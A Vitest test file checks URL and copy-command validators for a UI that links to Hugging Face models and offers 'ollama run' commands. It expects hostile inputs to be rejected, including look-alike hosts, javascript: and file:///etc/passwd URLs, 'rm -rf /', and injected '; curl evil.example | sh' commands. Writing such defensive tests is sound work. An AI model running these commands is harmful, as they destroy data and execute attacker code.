import { describe, it, expect } from 'vitest';
import { isAllowedExternalUrl, isAllowedCopyText } from './validate';

describe('isAllowedExternalUrl', () => {
	it('allows a Hugging Face model page over https', () => {
		expect(isAllowedExternalUrl('https://huggingface.co/bartowski/Llama-3.2-3B-Instruct-GGUF')).toBe(true);
	});
	it('rejects a look-alike host that merely starts with the allowed one', () => {
		expect(isAllowedExternalUrl('https://huggingface.co.evil.example/x/y')).toBe(false);
	});
	it('rejects a host that merely ends with the allowed one', () => {
		expect(isAllowedExternalUrl('https://evilhuggingface.co/x/y')).toBe(false);
	});
	it('rejects plain http (no downgrade)', () => {
		expect(isAllowedExternalUrl('http://huggingface.co/x/y')).toBe(false);
	});
	it('rejects non-http schemes even on the allowed host', () => {
		expect(isAllowedExternalUrl('javascript:alert(1)')).toBe(false);
		expect(isAllowedExternalUrl('file:///etc/passwd')).toBe(false);
	});
	it('rejects unparseable input', () => {
		expect(isAllowedExternalUrl('not a url')).toBe(false);
		expect(isAllowedExternalUrl('')).toBe(false);
	});
});

describe('isAllowedCopyText', () => {
	it('allows the exact ollama run command the UI emits', () => {
		expect(isAllowedCopyText('ollama run hf.co/bartowski/Llama-3.2-3B-Instruct-GGUF')).toBe(true);
	});
	it('allows repo names with dots, dashes and underscores', () => {
		expect(isAllowedCopyText('ollama run hf.co/TheBloke/Mistral-7B-Instruct-v0.1_GGUF')).toBe(true);
	});
	it('rejects shell metacharacters appended to a valid command', () => {
		expect(isAllowedCopyText('ollama run hf.co/a/b && rm -rf /')).toBe(false);
		expect(isAllowedCopyText('ollama run hf.co/a/b; curl evil.example | sh')).toBe(false);
	});
	it('rejects a newline-injected second command', () => {
		expect(isAllowedCopyText('ollama run hf.co/a/b\ncurl evil.example | sh')).toBe(false);
	});
	it('rejects anything that is not an ollama run command', () => {
		expect(isAllowedCopyText('rm -rf /')).toBe(false);
		expect(isAllowedCopyText('')).toBe(false);
	});
	it('rejects a missing or extra repo path segment', () => {
		expect(isAllowedCopyText('ollama run hf.co/onlyowner')).toBe(false);
		expect(isAllowedCopyText('ollama run hf.co/a/b/c')).toBe(false);
	});
});
